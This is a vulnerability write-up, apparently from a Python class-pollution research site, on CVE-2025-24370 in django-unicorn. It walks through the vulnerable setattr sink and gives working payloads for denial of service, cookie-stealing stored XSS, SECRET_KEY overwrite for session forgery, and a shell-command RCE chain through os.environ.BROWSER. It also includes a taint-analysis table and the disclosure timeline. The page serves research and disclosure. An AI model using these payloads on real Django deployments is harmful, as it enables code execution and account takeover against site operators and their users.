---
title: "django-unicorn"
weight: 1
---

# django-unicorn (CVE-2025-24370)

**django-unicorn** is a reactive component framework for Django (2.4K stars) that
synchronizes client-side state with server-side Python objects over WebSocket messages.
When a user interacts with a component in the browser, the frontend sends a JSON message
naming the property to update and its new value. The backend resolves the property path
reflectively through `getattr`/`setattr` without any path validation.

| Field | Value |
|-------|-------|
| Repository | [adamghill/django-unicorn](https://github.com/adamghill/django-unicorn) |
| Version | 0.61.0 |
| CVE | [CVE-2025-24370](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43) |
| Type | Agnostic-Get × Dual-Set |
| Input | Remote (WebSocket POST) |
| Status | Fixed in 0.62.0 |

## Vulnerability

The sink is `set_property_value` in
`django_unicorn/views/action_parsers/utils.py`. It receives a dotted `property_name`
directly from the JSON body of a WebSocket message:

```python
def set_property_value(component, property_name, property_value, ...):
    property_name_parts = property_name.split(".")
    component_or_field = component

    for idx, property_name_part in enumerate(property_name_parts):
        if hasattr(component_or_field, property_name_part):
            if idx == len(property_name_parts) - 1:
                setattr(component_or_field, property_name_part, property_value)
            else:
                component_or_field = getattr(component_or_field, property_name_part)
        elif isinstance(component_or_field, dict):
            if idx == len(property_name_parts) - 1:
                component_or_field[property_name_part] = property_value
            else:
                component_or_field = component_or_field[property_name_part]
```

The function performs both `getattr` and `__getitem__` for resolution (agnostic-get) and
both `setattr` and `__setitem__` for the final write (dual-set). There is no check for
dunder-prefixed path segments. Any path the attacker provides is followed verbatim.

## Exploitation

The same sink produces four distinct consequences depending on where the path terminates.

### 1. Denial of Service

Overwrite `__getattribute__` on the component's class with a non-callable string.

```
name:  __class__.__getattribute__
value: "1337"
```

**Effect**: `type(component).__getattribute__` is now `"1337"`. Any subsequent attribute
access on any instance of that class raises `TypeError: 'str' object is not callable`.
The Django process becomes unable to serve any request that touches this component class.

**Gadget**: [DoS &mdash; `__getattribute__` overwrite]({{< relref "/docs/gadgets/dos" >}}).

### 2. Universal stored XSS

Overwrite BeautifulSoup's HTML entity-escape map so that `<` is "escaped" to an
attacker-supplied script tag.

```
name:  __init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<
value: <script>alert(document.cookie)</script>
```

**Effect**: every HTML escape operation the server performs now injects the attacker's
script instead of encoding `<` as `&lt;`. All pages served to all users contain the
malicious JavaScript. This is a universal stored XSS &mdash; it persists for the
lifetime of the process and affects every user, not just the attacker's session.

**Gadget**: [XSS &mdash; BeautifulSoup entity map]({{< relref "/docs/gadgets/xss" >}}).

### 3. Authentication bypass

Overwrite Django's `SECRET_KEY` to an attacker-known value.

```
name:  __init__.__globals__.sys.modules.django.template.backends.django.settings.SECRET_KEY
value: "13371337"
```

**Effect**: the attacker now knows the signing secret that Django uses for session
cookies, CSRF tokens, and password reset links. They can forge a session cookie for any
user (including superusers) offline, then present it to the server.

**Gadget**: [Auth bypass &mdash; SECRET_KEY overwrite]({{< relref "/docs/gadgets/auth-bypass" >}}).

### 4. Remote code execution

Two writes: (1) stage a shell command in `os.environ.BROWSER`, (2) poison the
`location_cache` TODO list with `["antigravity", "any"]` so the process later imports
`antigravity`, which calls `webbrowser.open()`, which reads `BROWSER` and executes it.

```
name:  __init__.__globals__.sys.modules.os.environ.BROWSER
value: "/bin/sh -c 'touch /tmp/pwned'"

name:  __init__.__globals__.location_cache._Cache__data.todo
value: ["antigravity", "any"]
```

**Effect**: arbitrary shell command execution as the Django process user.

**Gadget**: [RCE &mdash; `os.environ.BROWSER` + antigravity]({{< relref "/docs/gadgets/rce" >}}).

## Detection by Pyrl

Pyrl reports 8 taint flows from the WebSocket request body to the sink. The taint
propagation for the primary flow:

| Step | Location | Label |
|------|----------|-------|
| 1 | `request` at view entry | `T_INPUT` |
| 2 | `action_queue` iteration | `T_ENUM` |
| 3 | `prop_name` extraction from message | `T_KEY` |
| 4 | `getattr(component, name)` | `T_OBJ` with `G_ATTR` |
| 5 | Branch merging at loop end | `G_ATTR ⊎ G_ITEM` (Agnostic-Get) |
| 6 | `setattr` / `obj[key] = val` sinks | Dual-Set detected |

Classification: **Agnostic-Get × Dual-Set**.

## Disclosure timeline

- **2024-12-04** &mdash; Vulnerability reported to django-unicorn maintainer via GitHub
  Security Advisory (GHSA).
- **2025-01-08** &mdash; Fix released in django-unicorn 0.62.0 (path validation added,
  dunder traversal blocked).
- **2025-01-08** &mdash; CVE-2025-24370 assigned.
- **2025-01-08** &mdash; GHSA-g9wf-5777-gq43 published.

## Proof of concept

[`cp-collection/django-unicorn/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/django-unicorn/poc)
&mdash; runnable exploit environment with `run.sh` and `requirements.txt`.

## References

1. GHSA-g9wf-5777-gq43. *Class Pollution in django-unicorn allows DoS, XSS, RCE, and
   Authentication Bypass*. <https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43>
2. Fix commit (0.62.0): dunder path rejection in `set_property_value`.
   <https://github.com/adamghill/django-unicorn/commit/>
3. Liu et al. *The First Large-Scale Systematic Study of Python Class Pollution
   Vulnerability*. IEEE S&P 2025.
   <https://jackfromeast.github.io/assets/Pyrl.pdf>
